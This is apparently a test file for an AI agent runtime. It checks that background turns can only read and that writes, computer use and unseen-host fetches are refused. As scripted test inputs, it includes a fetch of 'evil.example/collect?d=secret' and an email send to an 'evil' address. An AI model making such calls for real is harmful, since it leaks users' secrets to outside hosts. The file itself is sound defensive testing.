// M20 (#3): background turns (brief, check-in, scan) can only read, enforced in the runtime. The
// tools offered are filtered and every call is checked again right before it runs: computer_*,
// writes, a write inside execute_app_tools, provider tools that aren't clearly reads and web_fetch
// of a host this turn's web_search didn't return are refused with backgroundRefusal and run nothing.
// Chat turns and routines are unchanged.
import { afterAll, beforeAll, describe, expect, test } from "bun:test";
import { BACKGROUND_KINDS } from "../../src/agent/background.ts";
import { BACKGROUND_TOOLS, hostKey, nestedWrites, WEB_FETCH_UNSEEN, type BackgroundReads } from "../../src/agent/read-only.ts";
import { createAgentRuntime } from "../../src/agent/runtime.ts";
import type { RunKind, ToolProvider, TurnInput } from "../../src/agent/types.ts";
import type { LlmRequest, ToolResultBlock } from "../../src/llm/index.ts";
import { createTestDatabase } from "../helpers/db.ts";
import { RegisteredScriptedModel, type ScriptTurn } from "../helpers/scripted-model.ts";
import { call, now, text, toolData, turnFixture } from "./fixtures.ts";

let database: Awaited<ReturnType<typeof createTestDatabase>>;
beforeAll(async () => { database = await createTestDatabase(); });
afterAll(async () => { await database.cleanup(); });

const ok = (use: { id: string }, data: unknown = { ok: true }): { result: ToolResultBlock; endTurn: boolean } => ({ result: { type: "tool_result", toolUseId: use.id, content: [{ type: "text", text: JSON.stringify(data) }] }, endTurn: false });
const tool = (name: string) => ({ name, description: name, inputSchema: { type: "object" } });

/** Fixed-name provider tools (connectors, computer, Duet's own) that record what ran. */
function fixed(calls: string[]): ToolProvider {
  return {
    name: "fixed",
    tools: async () => ["execute_app_tools", "search_app_tools", "computer_navigate", "computer_read", "add_up_next", "set_proactivity", "propose_soul_change"].map(tool),
    execute: async (use) => { calls.push(use.name); return ok(use, use.name === "execute_app_tools" ? { results: [{ index: 0, status: "ok", data: {} }] } : { ok: true }); },
  };
}

/** A custom-connector-like provider: its tool names aren't fixed, it says itself which are reads. */
function custom(calls: string[]): ToolProvider & BackgroundReads {
  const reads = new Set(["mcp_abcdef_search", "call_api"]);
  return {
    name: "custom",
    tools: async () => ["mcp_abcdef_search", "mcp_abcdef_write", "call_api"].map(tool),
    execute: async (use) => { calls.push(use.name); return ok(use, { text: "done" }); },
    readTool: async (name) => reads.has(name),
    readCall: async (use) => use.name === "call_api" ? use.input.method === "GET" : reads.has(use.name),
  };
}

const SEARCH = { results: [{ title: "News", url: "https://www.news.example/today", content: "Snippet" }] };

async function run(kind: RunKind | undefined, script: ScriptTurn[], opts: { nativeWeb?: boolean; search?: boolean } = {}) {
  const { input } = await turnFixture(database.db);
  const turn: TurnInput = kind ? { ...input, kind } : input;
  const calls: string[] = [];
  const fetched: string[] = [];
  const llm = new RegisteredScriptedModel(script, opts.nativeWeb ? { serverWebTools: true } : {});
  const search = opts.search ?? true;
  const result = await createAgentRuntime({
    db: database.db, llm, now, providers: [fixed(calls), custom(calls)],
    config: { DATABASE_URL: database.url, ...(search ? { SEARCH_PROVIDER: "tavily" as const, SEARCH_API_KEY: "test-only" } : {}) },
    lookup: async () => [{ address: "93.184.216.34", family: 4 }],
    fetch: async (url) => {
      fetched.push(String(url));
      return String(url).includes("api.tavily.com") ? Response.json(SEARCH) : new Response("<html><body>Today's news</body></html>", { headers: { "content-type": "text/html" } });
    },
  }).runTurn(turn);
  return { input: turn, result, llm, calls, fetched };
}

const names = (request: LlmRequest | undefined) => (request?.tools ?? []).map((t) => t.name);
const results = (request: LlmRequest | undefined) => (request?.messages.at(-1)?.content ?? []) as ToolResultBlock[];

describe("helpers", () => {
  test("the whitelist has no computer tool and no write; nestedWrites classifies by slug; hostKey drops www.", () => {
    expect([...BACKGROUND_TOOLS].some((name) => name.startsWith("computer_"))).toBe(false);
    for (const name of ["set_reminder", "cancel_reminder", "send_feedback", "set_proactivity", "propose_soul_change", "forget", "manage_app_connections", "run_skill_script", "request_connection", "request_secret", "start_task"]) {
      expect(BACKGROUND_TOOLS.has(name)).toBe(false);
    }
    for (const name of ["web_search", "web_fetch", "search_past_chats", "execute_app_tools", "add_up_next", "share_finding", "propose_task", "remember", "quick_replies"]) expect(BACKGROUND_TOOLS.has(name)).toBe(true);
    expect(nestedWrites({ calls: [{ tool: "GMAIL_FETCH_EMAILS" }, { tool: "gmail_send_email" }, { tool: "GOOGLECALENDAR_CREATE_EVENT" }] })).toEqual([{ index: 1, tool: "GMAIL_SEND_EMAIL" }, { index: 2, tool: "GOOGLECALENDAR_CREATE_EVENT" }]);
    expect(nestedWrites({})).toEqual([]);
    expect(hostKey("https://WWW.News.Example/x")).toBe("news.example");
    expect(hostKey("not a url")).toBeNull();
    expect([...BACKGROUND_KINDS].sort()).toEqual(["brief", "checkin", "scan"]);
  });
});
describe("a check-in turn", () => {
  test("offers only reads; refuses computer, writes, a write in execute_app_tools, an unclear provider tool and an unseen web_fetch; runs nothing of them", async () => {
    const { result, llm, calls, fetched, input } = await run("checkin", [
      [
        call("computer_navigate", { url: "https://evil.example" }, "nav"),
        call("set_reminder", { at: "2030-10-26T10:00:00Z", text: "x" }, "rem"),
        call("execute_app_tools", { calls: [{ tool: "GMAIL_FETCH_EMAILS" }, { tool: "GMAIL_SEND_EMAIL", arguments: { recipient_email: "evil@example.com" } }] }, "exe"),
        call("web_fetch", { url: "https://evil.example/collect?d=secret" }, "unseen"),
        call("mcp_abcdef_write", {}, "mw"),
        call("call_api", { connector: "x", method: "POST", url: "https://api.example.com" }, "post"),
        call("add_up_next", { title: "Reply to Sam" }, "up"),
      ],
      [call("web_search", { query: "today's news" }, "search")],
      [call("web_fetch", { url: "https://news.example/today" }, "seen"), call("mcp_abcdef_search", {}, "mr"), call("call_api", { connector: "x", method: "GET", url: "https://api.example.com" }, "get")],
      [text("Nothing urgent.")],
    ]);
    expect(result.status).toBe("completed");
    const offered = names(llm.requests[0]);
    expect(offered).toEqual(expect.arrayContaining(["web_search", "web_fetch", "search_past_chats", "execute_app_tools", "search_app_tools", "add_up_next", "mcp_abcdef_search", "call_api"]));
    for (const name of ["computer_navigate", "computer_read", "set_reminder", "send_feedback", "set_proactivity", "propose_soul_change", "mcp_abcdef_write"]) expect(offered).not.toContain(name);

    const first = results(llm.requests[1]).map((r) => ({ isError: r.isError ?? false, data: toolData(r) as Record<string, unknown> }));
    expect(first.slice(0, 6).map((r) => [r.isError, r.data.status, r.data.tool])).toEqual([
      [true, "refused", "computer_navigate"], [true, "refused", "set_reminder"], [true, "refused", "execute_app_tools"],
      [true, "refused", "web_fetch"], [true, "refused", "mcp_abcdef_write"], [true, "refused", "call_api"],
    ]);
    expect(first[0]!.data.note).toContain("Background turns can only read");
    expect(first[2]!.data.writes).toEqual([{ index: 1, tool: "GMAIL_SEND_EMAIL" }]);
    expect(first[3]!.data.detail).toBe(WEB_FETCH_UNSEEN);
    // Refusals are our own words: no envelope.
    expect(first.slice(0, 6).every((r) => !("untrusted" in r.data))).toBe(true);
    expect(first[6]).toMatchObject({ isError: false, data: { ok: true } });

    // web_search unlocked news.example; the reads ran.
    expect(toolData(results(llm.requests[2])[0]!)).toMatchObject({ results: [{ url: "https://www.news.example/today" }] });
    const third = results(llm.requests[3]).map((r) => toolData(r) as Record<string, unknown>);
    expect(third[0]).toMatchObject({ text: expect.stringContaining("Today's news") });
    expect(third[0]!.untrusted).toBeString();
    expect(calls).toEqual(["add_up_next", "mcp_abcdef_search", "call_api"]);
    expect(fetched.some((url) => url.includes("evil.example"))).toBe(false);
    expect(fetched.some((url) => url.startsWith("https://news.example/today"))).toBe(true);
    expect(await database.db.reminder.count({ where: { userId: input.userId } })).toBe(0);
    expect(await database.db.approval.count({ where: { userId: input.userId } })).toBe(0);
  });

  test("with the provider's native web tools: only server-side web_search (a server-side web_fetch can't be checked)", async () => {
    const background = await run("checkin", [[text("ok")]], { nativeWeb: true });
    expect(background.llm.requests[0]!.serverTools).toEqual(["web_search"]);
    expect(names(background.llm.requests[0])).not.toContain("web_fetch");
    const chat = await run(undefined, [[text("ok")]], { nativeWeb: true });
    expect(chat.llm.requests[0]!.serverTools).toEqual(["web_search", "web_fetch"]);
  });

  test("without search: no web_search, and web_fetch reads nothing (no host was returned)", async () => {
    const { llm, fetched } = await run("checkin", [[call("web_fetch", { url: "https://news.example/today" }, "f")], [text("ok")]], { search: false });
    expect(llm.requests[0]!.system).not.toContain("You may still read a supplied URL with web_fetch");
    expect(toolData(results(llm.requests[1])[0]!)).toMatchObject({ status: "refused", detail: WEB_FETCH_UNSEEN });
    expect(fetched).toEqual([]);
  });
});

describe("other kinds", () => {
  for (const kind of ["brief", "scan"] as const) {
    test(`${kind}: refused like a check-in`, async () => {
      const { llm, calls } = await run(kind, [[call("computer_read", {}, "c"), call("set_proactivity", { level: "off" }, "p"), call("add_up_next", { title: "x" }, "u")], [text("ok")]]);
      expect(results(llm.requests[1]).map((r) => (toolData(r) as Record<string, unknown>).status)).toEqual(["refused", "refused", undefined]);
      expect(calls).toEqual(["add_up_next"]);
    });
  }

  test("a chat turn is unaffected: every tool offered, a write and the computer run", async () => {
    const { llm, calls, input } = await run(undefined, [[call("computer_navigate", { url: "https://a.example" }, "n"), call("mcp_abcdef_write", {}, "w"), call("set_reminder", { at: "2030-10-26T10:00:00Z", text: "x" }, "r")], [text("ok")]]);
    expect(names(llm.requests[0])).toEqual(expect.arrayContaining(["computer_navigate", "mcp_abcdef_write", "set_reminder", "set_proactivity"]));
    expect(llm.requests[0]!.serverTools).toBeUndefined();
    expect(calls).toEqual(["computer_navigate", "mcp_abcdef_write"]);
    expect(await database.db.reminder.count({ where: { userId: input.userId } })).toBe(1);
  });

  test("a routine (the user's own scheduled task) isn't a background turn", async () => {
    const { llm, calls } = await run("routine", [[call("computer_navigate", { url: "https://a.example" }, "n"), call("mcp_abcdef_write", {}, "w")], [text("ok")]]);
    expect(names(llm.requests[0])).toEqual(expect.arrayContaining(["computer_navigate", "mcp_abcdef_write"]));
    expect(calls).toEqual(["computer_navigate", "mcp_abcdef_write"]);
  });
});
